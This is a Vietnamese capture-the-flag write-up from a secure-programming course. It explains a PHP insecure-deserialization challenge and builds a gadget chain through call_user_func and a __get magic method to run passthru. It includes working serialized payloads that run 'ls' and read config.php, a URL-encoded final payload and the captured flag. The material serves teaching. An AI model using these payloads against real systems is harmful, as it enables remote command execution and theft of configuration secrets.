# Nhóm bài tập CTF ✌
- **Insecure Deserialization**:<br>
- **Note:** Bài tập CTF của môn Lập trình an toàn và khai thác lổ hổng phần mềm<br>
- **Team:** Blackberries<br>
- **Link:** http://45.122.249.68:10001/

## Write Up:<br>
- Vào link, ta thấy một đoạn code PHP. 
```
<?php
#include "config.php";
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
class do_nothing{
    public $why;
    public $i_use_this;
    public function __construct($a,$b){
        $this->why = $a;
        $this->i_use_this = $b;
    }
    public function __get($method){
        if(isset($this->why)){
            return $this->i_use_this;
        }
        return $method;
    }
}
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
?>
```
- Ta thấy có 3 class chính `User`, `Show_color` và `do_nothing`<br>
- Xem đoạn thực thi code:
```
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
```
Ta hiểu đoạn code trên sẽ lấy biến `code` trong URL thông qua hàm `$_GET[]` và `unserialize` biến `code` đó. Trong trường hợp biến `code` chưa có giá trị thì in ra đoạn code PHP như trên - `highlight_file(__FILE__);`. Đồng thời có sự xuất hiện của hai hàm `__construct()` và `__destruct()` nên thuận lợi cho việc deserialization. Vì thao tác `unserialize` không hề có verify input nên chúng ta có thể tận dụng lổ hổng này để khai thác.
- Ta để ý thấy `User` class có vẻ đặc biệt khi có biến `admin=false`và khi `admin=true` thì có in ra dòng chữ `"hi admin, here is your flag"`. Vậy ta sẽ serialize `User` object.
```
$a = new User('name');
$b = serialize($a);
echo $b;
```
Ta được: `O:4:"User":2:{s:10:"Username";s:4:"name";s:14:"Useris_admin";b:0;}`.
Chỉnh sửa giá trị `admin` thành `true`. Thay `b:0` thành `b:1`. Gửi giá trị biến code lên trang: 
http://45.122.249.68:10001?code=O:4:"User":2:{s:10:"Username";s:4:"name";s:14:"Useris_admin";b:1;}
Ta chỉ thấy một trang rỗng. Vậy là hướng này không đúng.
- Xét 2 class tiếp theo ta thấy có vẻ thuận lợi hơn vì ở class `Show_color` có thực hiện hàm `call_user_func()`. Có vẻ đây mới là hướng đúng vì hàm này sẽ thực thi lệnh với tham số thứ nhất là tên hàm và các tham số sau là tham số đầu vào cho hàm. Xem thêm thông tin [Tại đây](https://www.php.net/manual/en/function.call-user-func). Vậy ta sẽ xem xét một số hàm **execute shell** trong PHP: `exec()`, `shell_exec()`, `system()`, `passthru()`. Trong đó hàm `system()` và `passthru()` là thuận tiện nhất vì không cần đòi hỏi thêm thao tác nào.
-  Tiếp theo là ta xem xét cách để đưa hàm **excute shell** vào phương thức. 
```
public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
```
- Theo ý tưởng ban đầu, ta sẽ sử dụng hàm `passthru()` làm tham số thứ nhất và lệnh `ls` làm tham số thứ 2. Nhưng vấn đề ở đây là với tham số thứ 2 mình có thể truyền `ls` vào biến `$color` thông qua **constructor** nhưng không thể đưa `passthru` vào biến thứ nhất vì nó truy vấn 2 lần `$this->type->adu`, vậy mình phải làm sao đó để `$this-type` là một object và sau đó lấy `adu` trong chính object đó.
- Nhìn vào class `do_nothing`, ta thấy có một phương thức `__get()`. Đây là một trong [Magic Method](https://www.php.net/manual/en/language.oop5.magic.php) để override các hàm mặc định được định nghĩa bởi PHP. `__get()` nhận tham số đầu vào có thể là một member hoặc một method. Trong đoạn code, phương thức `__get()` thực hiện trả về giá trị   `this ->i_use_this` khi kiểm tra `this->why` khác rỗng hay không. 
### Solution:
- Khỏi tạo đối tượng  `do_nothing` với hai giá trị đầu vào là `123` và `passthru`. (Giá trị đầu là tùy ý)
- Khỏi tạo đối tượng `Show_color` với hai giá trị đầu vào là **do_nothing object** ở trên và lệnh muốn thực thi `ls`. 
- Sau đó `serialize` đối tượng  `Show_color`
**Sample**:
```
$a = new do_nothing(123,"passthru");
$b = new Show_color($a,"ls");
$code = serialize($b);
echo $code;
```
Kết quả:
`O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:10:"do_nothing":2:{s:3:"why";i:123;s:10:"i_use_this";s:8:"passthru";}}`
- Đưa vào biến `code` làm payload<br>

<p align="center">
  <img src="https://user-images.githubusercontent.com/48288606/138675519-6fc911d4-823a-405a-b6f8-a74da4e05dec.png">
</p>

- Ta thấy ở trên có 2 file. Vậy là đã thành công, vấn đề logic ở đây là khi thực hiện  `call_user_func($this->type->adu,$this->color);`. `$this->type` ở đây sẽ thành biến `$a`
, sau đó mình hình dung là `call_user_func($a->adu,$this->color);`. Quá trình `$a->adu` sẽ được thực hiện trong phương thức `__get($method)` đã được định nghĩa trước. Và `$method` ở đây là `adu`, mà cái này hầu như không có giá trị vì biến `$this->why` mình đã set khác **null** để **block** phía trong thực thi `return $this->i_use_this;` và tương đương `return passthru($command)` với **$command** là mình đã khởi tạo cho Object.
- Sau đó,  ta sẽ thử đọc file `config.php` trước. Chỉnh lệnh `ls` thành `cat config.php` và thực hiện lại quá trình **serialize** theo các bước trên.
Payload: O:10:"Show_color":2:{s:5:"color";s:13:"cat config.php";s:4:"type";O:10:"do_nothing":2:{s:3:"why";i:123;s:10:"i_use_this";s:8:"passthru";}}

<p align="center">
  <img src="https://user-images.githubusercontent.com/48288606/138678027-6bf37d9f-08e8-4fc4-a663-242a7e406030.png">
</p>

Dường như không có tác dụng, ta mới để ý một chuyện là ta thao tác trên URL nên bị ảnh hưởng bởi **URL Encode**. Nên ở chỗ `cat index.php` có khoảng trắng là ký tự đặc biệt bị ảnh hưởng. Để cho chắc, ta sẽ encode cả payload.

<p align="center">
  <img src="https://user-images.githubusercontent.com/48288606/138679801-71a74d2a-a376-478c-a92f-29e0da356e67.png">
</p>

**Final Payload**: %4f%3a%31%30%3a%22%53%68%6f%77%5f%63%6f%6c%6f%72%22%3a%32%3a%7b%73%3a%35%3a%22%63%6f%6c%6f%72%22%3b%73%3a%31%34%3a%22%63%61%74%20%63%6f%6e%66%69%67%2e%70%68%70%22%3b%73%3a%34%3a%22%74%79%70%65%22%3b%4f%3a%31%30%3a%22%64%6f%5f%6e%6f%74%68%69%6e%67%22%3a%32%3a%7b%73%3a%33%3a%22%77%68%79%22%3b%69%3a%31%32%33%3b%73%3a%31%30%3a%22%69%5f%75%73%65%5f%74%68%69%73%22%3b%73%3a%38%3a%22%70%61%73%73%74%68%72%75%22%3b%7d%7d
- Xuất hiện trang rỗng, vô source code để kiểm tra.
```
<?php
$flag = "flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}";
?>
```
**=>flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}**
